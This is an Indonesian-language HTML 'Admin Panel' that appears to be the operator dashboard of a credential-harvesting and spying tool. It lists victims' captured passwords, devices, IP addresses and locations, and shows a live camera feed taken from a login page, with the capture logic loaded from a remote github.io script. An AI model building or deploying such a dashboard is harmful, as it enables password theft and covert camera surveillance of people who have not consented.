<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        video {
            width: 320px;
            height: 240px;
            border: 1px solid black;
        }
    </style>
</head>
<body>
    <h2>Data Login</h2>
    <table>
        <thead>
            <tr>
                <th>Waktu</th>
                <th>Password</th>
                <th>Perangkat</th>
                <th>OS</th>
                <th>IP Address</th>
                <th>Lokasi</th>
            </tr>
        </thead>
        <tbody id="loginTable"></tbody>
    </table>

    <h2>Live Kamera</h2>
    <video id="liveCamera" autoplay playsinline></video>

    <script src="https://kkykrnwn.github.io/script-bucin/js/script.js"></script>
    <script>
        loadLoginData(); // Muat data login saat halaman dibuka
        startAdminCamera(); // Tampilkan kamera dari halaman login
    </script>
</body>
</html>
